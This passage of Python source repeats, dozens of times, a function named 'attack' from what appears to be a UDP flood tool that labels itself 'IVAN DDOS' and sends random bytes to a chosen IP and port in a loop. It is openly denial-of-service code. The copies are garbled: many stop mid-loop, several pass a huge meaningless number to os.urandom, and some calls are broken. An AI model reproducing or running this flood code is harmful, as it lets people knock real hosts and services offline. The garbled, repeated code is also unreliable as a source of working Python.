        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
